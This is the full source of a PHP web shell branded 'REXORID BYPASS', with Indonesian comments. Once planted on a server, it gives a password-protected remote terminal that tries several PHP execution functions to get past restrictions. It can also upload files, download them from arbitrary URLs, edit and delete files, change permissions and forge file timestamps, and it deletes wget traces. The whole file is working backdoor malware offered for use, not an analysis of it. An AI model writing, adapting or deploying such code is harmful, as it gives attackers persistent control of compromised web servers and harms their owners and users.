<?php
session_start();

$APP_TITLE = '★ REXORID BYPASS ★';
$APP_PASSWORD_HASH = '$2a$12$ewPKvB.e440h0921Wlax4eUjrHJZbEw1G8zxAS0VgVMnHjVJot2a2';

/* ---------- auth ---------- */
function is_logged_in(){return !empty($_SESSION['logged_in']);}
function login($pass){global $APP_PASSWORD_HASH; if(password_verify($pass,$APP_PASSWORD_HASH)){$_SESSION['logged_in']=true;return true;}return false;}
function logout(){$_SESSION=[];session_destroy();}
if(isset($_GET['logout'])){logout();header('Location:?');exit;}

function h($s){return htmlspecialchars($s,ENT_QUOTES,'UTF-8');}

// ✅ DIPERBAIKI: fmt_bytes menangani false, null, dan non-numeric
function fmt_bytes($size){
  if ($size === '-' || $size === null || $size === false || !is_numeric($size)) {
    return '-';
  }
  $size = (float)$size;
  if ($size < 0) return '-';
  $units = ['B','KB','MB','GB','TB'];
  $i = 0;
  while ($size >= 1024 && $i < count($units) - 1) {
    $size /= 1024;
    $i++;
  }
  return round($size, 2).' '.$units[$i];
}

function rrmdir($dir){
  if(is_dir($dir)){
    $it=new RecursiveDirectoryIterator($dir,FilesystemIterator::SKIP_DOTS);
    $files=new RecursiveIteratorIterator($it,RecursiveIteratorIterator::CHILD_FIRST);
    foreach($files as $file){$file->isDir()?@rmdir($file):@unlink($file);}
    @rmdir($dir);
  }elseif(is_file($dir)) @unlink($dir);
}

/* ---------- ignore list ---------- */
$IGNORE_LIST = ['.wget-hsts'];
function is_ignored_name($name){ global $IGNORE_LIST; return in_array($name, $IGNORE_LIST, true); }
function is_ignored_target($path){ $base = basename($path); return is_ignored_name($base); }

/* ---------- helper: sanitize wget command & cleanup ---------- */
function sanitize_wget_cmd($cmd){
    if(!preg_match('/\bwget\b/i', $cmd)) return $cmd;
    if(preg_match('/--no-hsts|--hsts-file/i', $cmd)) return $cmd;
    return preg_replace_callback(
        '/(\b(?:\/[-.\w]+\/)?wget\b)/i',
        function($m){ return $m[1].' --no-hsts'; },
        $cmd,
        1
    );
}

function cleanup_wget_hsts($cwd){
    if(!$cwd) return;
    $f = rtrim($cwd, '/') . '/.wget-hsts';
    if(file_exists($f) && is_file($f)){
        @unlink($f);
    }
}

/* ---------- login page ---------- */
if(!is_logged_in()){
  if($_SERVER['REQUEST_METHOD']==='POST'&&isset($_POST['password'])){
    if(login($_POST['password'])){header('Location:?');exit;}
    $err='Password salah';
  }
  echo '<!doctype html><html><head><meta charset="utf-8"><title>Login</title><style>
  body{
    background:url("https://raw.githubusercontent.com/rexorid/shell/main/img/wallhaven-1pdy5v.png  ") no-repeat center center fixed;
    background-size:cover;
    color:#fff;
    display:flex;
    align-items:center;
    justify-content:flex-start;
    height:100vh;
    font-family:monospace;
    text-shadow:0 1px 2px #000;
    padding-left:60px;
  }
  .box{
    background:rgba(0,0,0,0.4);
    backdrop-filter:blur(6px);
    padding:20px;
    border-radius:10px;
    width:300px;
  }
  .box h1{
    font-size:18px;
    color:#93c5fd;
    text-align:center;
  }
  .box input{
    width:100%;
    margin:6px 0;
    padding:10px;
    border-radius:6px;
    border:1px solid rgba(255,255,255,0.2);
    background:rgba(0,0,0,0.35);
    color:#fff;
  }
  .box input[type=submit]{
    background:#2563eb;
    border:none;
    cursor:pointer;
  }
  .err{
    color:#f87171;
    font-size:14px;
    text-align:center;
  }
  .marquee {
    position:fixed;
    bottom:0;
    left:0;
    width:100%;
    background:rgba(0,0,0,0.4);
    color:#93c5fd;
    padding:6px 0;
    font-size:14px;
    overflow:hidden;
    white-space:nowrap;
  }
  .marquee span {
    display:inline-block;
    padding-left:100%;
    animation:scroll 15s linear infinite;
  }
  @keyframes scroll {
    0%   { transform: translateX(0); }
    100% { transform: translateX(-100%); }
  }
  </style></head><body>
  <div class="box"><h1>'.$APP_TITLE.'</h1>
  <form method="post">
    <input type="password" name="password" placeholder="Password" required>
    <input type="submit" value="Login">
  </form>'
  .(!empty($err)?'<div class="err">'.$err.'</div>':'').'
  </div>
  <div class="marquee"><span>★ Rexorid ★</span></div>
  </body></html>';exit;
}

/* ---------- main ---------- */
define('BASE_DIR', getcwd());

$notice='';
if (isset($_GET['notice'])) {
    $notice = $_GET['notice'];
}

if (isset($_GET['p'])) {
    $cand = rtrim($_GET['p'], '/');
    if ($cand === '') $cand = BASE_DIR;
    if (is_dir($cand)) {
        $cwd = $cand;
    } else {
        $cwd = BASE_DIR;
        $notice = 'Directory tidak ditemukan. Kembali ke BASE_DIR.';
    }
} else {
    $cwd = BASE_DIR;
}

$action = $_GET['action'] ?? null;
$target = $_GET['file'] ?? null;
$terminal_output = '';

/* ---------- fungsi robust command (dengan cwd support) ---------- */
function run_command($cmd, $cwd = null){
    $rc = null; $out = ''; $method = null;

    $cmd = sanitize_wget_cmd($cmd);

    $env = null;
    if ($cwd) {
        $env = array_merge($_ENV ?: [], [
            'HOME' => $cwd,
            'PWD'  => $cwd,
            'PATH' => getenv('PATH')?:('/usr/local/bin:/usr/bin:/bin'),
        ]);
    }

    if(function_exists('proc_open')){
        $des = [0=>["pipe","r"],1=>["pipe","w"],2=>["pipe","w"]];
        $proc = @proc_open($cmd." 2>&1", $des, $pipes, $cwd?:null, $env);
        if(is_resource($proc)){
            @fclose($pipes[0]);
            $out = stream_get_contents($pipes[1]); @fclose($pipes[1]);
            $err = stream_get_contents($pipes[2]); @fclose($pipes[2]);
            $rc = proc_close($proc);
            $out .= ($err ? "\n[stderr]\n".$err : "");
            $method = 'proc_open';
        }
    }

    if(!$method && function_exists('exec')){
        if($cwd) $cmd = 'cd ' . escapeshellarg($cwd) . ' && ' . $cmd;
        $tmp = [];
        exec($cmd." 2>&1", $tmp, $rc);
        $out = implode("\n", $tmp);
        $method = 'exec';
    }
    if(!$method && function_exists('shell_exec')){
        if($cwd) $cmd = 'cd ' . escapeshellarg($cwd) . ' && ' . $cmd;
        $out = shell_exec($cmd." 2>&1");
        $rc = is_null($out) ? 1 : 0;
        $method = 'shell_exec';
    }
    if(!$method && function_exists('popen')){
        if($cwd) $cmd = 'cd ' . escapeshellarg($cwd) . ' && ' . $cmd;
        $h = @popen($cmd." 2>&1", 'r');
        if($h){
            $out = '';
            while(!feof($h)){
                $out .= fgets($h, 4096);
            }
            $rc = pclose($h);
            $method = 'popen';
        }
    }
    if(!$method && function_exists('system')){
        if($cwd) $cmd = 'cd ' . escapeshellarg($cwd) . ' && ' . $cmd;
        ob_start();
        system($cmd." 2>&1", $rc);
        $out = ob_get_clean();
        $method = 'system';
    }

    cleanup_wget_hsts($cwd);

    if($method){
        return "Method: $method\n\n[Command]\n$cmd\n\n[Output]\n".($out?:'[no output]')."\n\n[Exit code] ".(is_int($rc)?$rc:'[unknown]');
    } else {
        return "Gagal mengeksekusi command. Semua metode gagal.\n\n".
               "disable_functions: ".(ini_get('disable_functions')?:'[none]')."\n".
               "open_basedir: ".(ini_get('open_basedir')?:'[none]')."\n".
               "PATH: ".(getenv('PATH')?:'[empty]')."\n";
    }
}

/* ---------- POST actions ---------- */
if($_SERVER['REQUEST_METHOD']==='POST'){
  if($action==='save' && $target && is_file($target)){
    if(is_ignored_target($target)){
      $msg = 'Operasi tidak diizinkan pada file yang diabaikan.';
      header('Location:?p='.rawurlencode(dirname($target)).'&notice='.rawurlencode($msg)); exit;
    }
    @file_put_contents($target, $_POST['content']);
    header('Location:?p='.rawurlencode(dirname($target))); exit;
  }
  if($action==='rename' && $target){
    if(is_ignored_target($target)){
      $msg = 'Operasi tidak diizinkan pada file yang diabaikan.';
      header('Location:?p='.rawurlencode(dirname($target)).'&notice='.rawurlencode($msg)); exit;
    }
    $n=basename($_POST['name']);
    if($n!=='') @rename($target, dirname($target).'/'.$n);
    header('Location:?p='.rawurlencode(dirname($target))); exit;
  }
  if($action==='chmod' && $target){
    if(is_ignored_target($target)){
      $msg = 'Operasi tidak diizinkan pada file yang diabaikan.';
      header('Location:?p='.rawurlencode(dirname($target)).'&notice='.rawurlencode($msg)); exit;
    }
    $m=preg_replace('/[^0-7]/','',$_POST['mode']);
    if($m!=='') @chmod($target, octdec($m));
    header('Location:?p='.rawurlencode(dirname($target))); exit;
  }
  if($action==='touch' && $target){
    if(is_ignored_target($target)){
      $msg = 'Operasi tidak diizinkan pada file yang diabaikan.';
      header('Location:?p='.rawurlencode(dirname($target)).'&notice='.rawurlencode($msg)); exit;
    }
    $dt=trim($_POST['datetime']);
    $ts=strtotime($dt)?:time();
    @touch($target,$ts);
    header('Location:?p='.rawurlencode(dirname($target))); exit;
  }
  if($action==='mkdir'){
    $n=basename($_POST['name']);
    if($n!=='') @mkdir($cwd.'/'.$n,0755,true);
    header('Location:?p='.rawurlencode($cwd)); exit;
  }
  if($action==='terminal' && !empty($_POST['cmd'])){
    $cmd_raw = trim($_POST['cmd']);
    $safe_cwd = (isset($cwd) && is_dir($cwd)) ? $cwd : BASE_DIR;
    $terminal_output = run_command($cmd_raw, $safe_cwd);
  }

  if(isset($_POST['upload']) && !empty($_FILES['file']) && isset($_FILES['file']['tmp_name'])){
    $orig = $_FILES['file']['name'] ?? '';
    $safe = basename($orig);
    if(is_ignored_name($safe)){
      $msg = 'Upload di-skip: file \"'. $safe .'\" tidak diperbolehkan.';
      header('Location:?p='.rawurlencode($cwd).'&notice='.rawurlencode($msg)); exit;
    }
    if(is_uploaded_file($_FILES['file']['tmp_name'])){
      $dest = $cwd . '/' . $safe;
      if(@move_uploaded_file($_FILES['file']['tmp_name'], $dest)){
        $msg = 'Upload berhasil: '. $safe;
      } else {
        $msg = 'Gagal memindahkan file.';
      }
    } else {
      $msg = 'Tidak ada file yang di-upload.';
    }
    header('Location:?p='.rawurlencode($cwd).'&notice='.rawurlencode($msg)); exit;
  }

  if(isset($_POST['upload_url']) && !empty($_POST['file_url'])){
    $url = trim($_POST['file_url']);
    $path = parse_url($url, PHP_URL_PATH);
    $name = $path ? basename($path) : '';
    $safe = $name ?: 'download_'.time();
    $safe = basename($safe);
    if(is_ignored_name($safe)){
      $msg = 'Download di-skip: file \"'. $safe .'\" tidak diperbolehkan.';
      header('Location:?p='.rawurlencode($cwd).'&notice='.rawurlencode($msg)); exit;
    }
    $dest = $cwd . '/' . $safe;
    $ok = false;
    if(function_exists('curl_version')){
      $ch = curl_init($url);
      curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
      curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
      curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
      curl_setopt($ch, CURLOPT_FAILONERROR, true);
      $data = curl_exec($ch);
      curl_close($ch);
      if($data !== false && $data !== null){
        if(@file_put_contents($dest, $data) !== false) $ok = true;
      }
    } elseif(ini_get('allow_url_fopen')){
      $data = @file_get_contents($url);
      if($data !== false){
        if(@file_put_contents($dest, $data) !== false) $ok = true;
      }
    } else {
      $msg = 'Tidak dapat mendownload: curl dan allow_url_fopen tidak tersedia.';
      header('Location:?p='.rawurlencode($cwd).'&notice='.rawurlencode($msg)); exit;
    }
    $msg = $ok ? 'Download berhasil: '. $safe : 'Download gagal.';
    header('Location:?p='.rawurlencode($cwd).'&notice='.rawurlencode($msg)); exit;
  }
}

/* ---------- GET actions ---------- */
if($action==='delete' && $target){
  if(is_ignored_target($target)){
    $msg = 'Operasi delete diblok: file yang diabaikan.';
    header('Location:?p='.rawurlencode($cwd).'&notice='.rawurlencode($msg)); exit;
  }
  rrmdir($target);
  header('Location:?p='.rawurlencode($cwd)); exit;
}
if(isset($_GET['d'])){
  $f = $_GET['d'];
  if($f && is_file($f)){
    if(is_ignored_target($f)){
      $msg = 'Download diblok: file yang diabaikan.';
      header('Location:?p='.rawurlencode($cwd).'&notice='.rawurlencode($msg)); exit;
    }
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename=\"'.basename($f).'\"');
    header('Content-Length: '.filesize($f));
    readfile($f); exit;
  }
}

/* ---------- list dir ---------- */
$raw_items = @scandir($cwd) ?: [];
$items = [];
foreach($raw_items as $it){
  if($it==='.'||$it==='..') continue;
  if(is_ignored_name($it)) continue;
  $items[] = $it;
}
?>
<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title><?=h($APP_TITLE)?></title>
<style>
body {
  background:url("https://raw.githubusercontent.com/rexorid/shell/main/img/as.png  ") no-repeat right center fixed;
  background-size:cover;
  color:#fff;
  font-family:monospace;
  margin:0;
  text-shadow:0 1px 2px rgba(0,0,0,0.8);
}
header {
  padding:10px 15px;
  background:transparent;
  border-bottom:1px solid rgba(255,255,255,0.25);
  display:flex;
  justify-content:space-between;
  align-items:center;
}
header .title {font-weight:bold;color:#93c5fd}

a {color:#60a5fa;text-decoration:none}
a:hover {text-decoration:underline}

.wrap {width:72%;margin:20px 40px}

.card {
  margin-bottom:14px;
  padding:12px;
  background:transparent;
  border:1px solid rgba(255,255,255,0.25);
  border-radius:8px;
}
.card h3 {margin:0 0 8px;color:#93c5fd;font-size:14px}

.notice {
  margin-bottom:10px;
  padding:8px;
  border-radius:6px;
  background:transparent;
  border:1px solid rgba(255,255,255,0.25);
}

table {width:100%;border-collapse:collapse;font-size:14px}
th,td {
  padding:8px;
  border-bottom:1px solid rgba(255,255,255,0.25);
  text-align:left
}
tr:hover td {background:rgba(255,255,255,0.1)}

.perm-green{color:#22c55e;font-weight:bold}
.perm-red{color:#ef4444;font-weight:bold}

input[type=text],
input[type=file],
textarea {
  width:100%;
  padding:8px;
  border-radius:6px;
  border:1px solid rgba(255,255,255,0.25);
  background:transparent;
  color:#fff;
  margin:6px 0;
}
textarea {height:420px}

button,
input[type=submit] {
  padding:6px 12px;
  border-radius:6px;
  border:1px solid rgba(255,255,255,0.25);
  background:transparent;
  color:#fff;
  cursor:pointer;
}
button:hover,
input[type=submit]:hover {
  background:rgba(255,255,255,0.15);
}

.controls-grid {
  display:grid;
  grid-template-columns: repeat(auto-fit, minmax(320px,1fr));
  gap:10px;
}
.ctrl {
  display:flex;
  align-items:center;
  gap:8px;
  padding:8px;
  border-radius:8px;
  background:transparent;
  border:1px solid rgba(255,255,255,0.25);
}
.ctrl label {min-width:110px;color:#93c5fd}
.ctrl input[type=text], .ctrl input[type=file]{flex:1;margin:0}
.ctrl .go {
  background:transparent;
  border:1px solid rgba(34,197,94,0.6);
  color:#22c55e;
  padding:7px 12px;
  border-radius:999px;
  font-weight:bold;
}
.ctrl .go:hover {
  background:rgba(34,197,94,0.15);
}

pre {
  background:transparent;
  border:1px solid rgba(255,255,255,0.25);
  border-radius:8px;
  padding:10px;
  overflow:auto;
}
</style>
</head>
<body>
<header>
  <div class="title"><?=h($APP_TITLE)?></div>
  <div><a href="?logout=1">Logout</a></div>
</header>
<div class="wrap">

  <?php if($notice){ echo '<div class="notice">'.h($notice).'</div>'; } ?>

  <!-- Breadcrumb -->
  <div class="card"><h3>Path</h3><div>
  <?php
  $parts = explode('/', trim($cwd,'/'));
  $path_accum='';
  echo '<a href="?p=/">/</a>';
  foreach($parts as $part){
    if($part==='') continue;
    $path_accum.='/'.$part;
    echo ' / <a href="?p='.rawurlencode($path_accum).'">'.h($part).'</a>';
  }
  ?></div></div>

  <!-- File Manager -->
  <div class="card">
    <h3>File Manager</h3>
    <table>
      <tr><th>Type</th><th>Name</th><th>Size</th><th>Perms</th><th>Modified</th><th>Actions</th></tr>
      <?php foreach($items as $it): if($it==='.'||$it==='..') continue;
        $abs = $cwd.'/'.$it;
        $isDir = is_dir($abs);
        // ✅ DIPERBAIKI: handle filesize dengan aman
        if ($isDir) {
            $size = '-';
        } else {
            $fs = @filesize($abs);
            $size = ($fs !== false) ? $fs : '-';
        }
        $perm = substr(sprintf("%o",@fileperms($abs)),-4);
        $mtime = @filemtime($abs);
        $mtimeStr = $mtime ? date('Y-m-d H:i:s',$mtime) : '-';
        $permClass = is_writable($abs) ? 'perm-green' : 'perm-red';
      ?>
      <tr>
        <td><?=$isDir?'Dir':'File'?></td>
        <td><?=$isDir?'📂':'📄'?> <a href="?p=<?=rawurlencode($abs)?>"><?=h($it)?></a></td>
        <td><?=h(fmt_bytes($size))?></td>
        <td class="<?=$permClass?>"><?=h($perm)?></td>
        <td><?=h($mtimeStr)?></td>
        <td>
          <a href="?action=edit&file=<?=rawurlencode($abs)?>&p=<?=rawurlencode($cwd)?>">Edit</a> |
          <a href="?action=chmod&file=<?=rawurlencode($abs)?>&p=<?=rawurlencode($cwd)?>">Chmod</a> |
          <a href="?action=rename&file=<?=rawurlencode($abs)?>&p=<?=rawurlencode($cwd)?>">Rename</a> |
          <a href="?action=delete&file=<?=rawurlencode($abs)?>&p=<?=rawurlencode($cwd)?>" onclick="return confirm('Delete <?=h(addslashes($it))?> ?')">Delete</a> |
          <a href="?d=<?=rawurlencode($abs)?>">Download</a> |
          <a href="?action=touch&file=<?=rawurlencode($abs)?>&p=<?=rawurlencode($cwd)?>">Touch</a>
        </td>
      </tr>
      <?php endforeach; ?>
    </table>
  </div>

  <!-- Controls -->
  <div class="card"><h3>Controls</h3>
    <div class="controls-grid">

      <form method="get" class="ctrl">
        <label>Change Dir:</label>
        <input type="text" name="p" value="<?=h($cwd)?>" placeholder="/path/to/dir" required>
        <button class="go" type="submit">⮕</button>
      </form>

      <form method="post" action="?action=terminal&p=<?=rawurlencode($cwd)?>" class="ctrl">
        <label>Terminal:</label>
        <input type="text" name="cmd" placeholder="Enter command" required>
        <button class="go" type="submit">⮕</button>
      </form>

      <form method="post" enctype="multipart/form-data" class="ctrl">
        <label>Upload File:</label>
        <input type="file" name="file" required>
        <button class="go" type="submit" name="upload" value="1">⮕</button>
      </form>

      <form method="post" class="ctrl">
        <label>Upload URL:</label>
        <input type="text" name="file_url" placeholder="https://example.com/file.zip  " required>
        <button class="go" type="submit" name="upload_url" value="1">⮕</button>
      </form>

      <form method="post" action="?action=mkdir&p=<?=rawurlencode($cwd)?>" class="ctrl">
        <label>Make Dir:</label>
        <input type="text" name="name" placeholder="New Directory" required>
        <button class="go" type="submit">⮕</button>
      </form>

    </div>
  </div>

  <?php
  if($action==='edit' && $target && is_file($target)){
    if(is_ignored_target($target)){
      echo '<div class="card"><h3>Info</h3><div class="notice">Operasi edit diblok untuk file yang diabaikan.</div></div>';
    } else {
      $content=@file_get_contents($target);
      echo '<div class="card"><h3>Edit: '.h(basename($target)).'</h3>
      <form method="post" action="?action=save&file='.rawurlencode($target).'&p='.rawurlencode($cwd).'">
      <textarea name="content">'.h($content).'</textarea>
      <input type="submit" value="Save"></form></div>';
    }
  }
  if($action==='chmod' && $target){
    if(is_ignored_target($target)){
      echo '<div class="card"><h3>Info</h3><div class="notice">Operasi chmod diblok untuk file yang diabaikan.</div></div>';
    } else {
      $curPerm=substr(sprintf("%o",@fileperms($target)),-4);
      echo '<div class="card"><h3>Chmod: '.h(basename($target)).'</h3>
      <form method="post" action="?action=chmod&file='.rawurlencode($target).'&p='.rawurlencode($cwd).'">
      <input type="text" name="mode" value="'.h($curPerm).'" placeholder="0755">
      <input type="submit" value="Apply"></form></div>';
    }
  }
  if($action==='rename' && $target){
    if(is_ignored_target($target)){
      echo '<div class="card"><h3>Info</h3><div class="notice">Operasi rename diblok untuk file yang diabaikan.</div></div>';
    } else {
      echo '<div class="card"><h3>Rename: '.h(basename($target)).'</h3>
      <form method="post" action="?action=rename&file='.rawurlencode($target).'&p='.rawurlencode($cwd).'">
      <input type="text" name="name" value="'.h(basename($target)).'">
      <input type="submit" value="Rename"></form></div>';
    }
  }
  if($action==='touch' && $target){
    if(is_ignored_target($target)){
      echo '<div class="card"><h3>Info</h3><div class="notice">Operasi touch diblok untuk file yang diabaikan.</div></div>';
    } else {
      $mt=@filemtime($target)?:time();
      echo '<div class="card"><h3>Touch: '.h(basename($target)).'</h3>
      <form method="post" action="?action=touch&file='.rawurlencode($target).'&p='.rawurlencode($cwd).'">
      <input type="text" name="datetime" value="'.date('Y-m-d H:i:s',$mt).'" style="width:250px">
      <input type="submit" value="Update"></form></div>';
    }
  }
  if($action==='terminal' && $terminal_output!==''){
    echo '<div class="card"><h3>Terminal Output</h3><pre>'.h($terminal_output).'</pre></div>';
  }
  ?>
</div>
</body></html>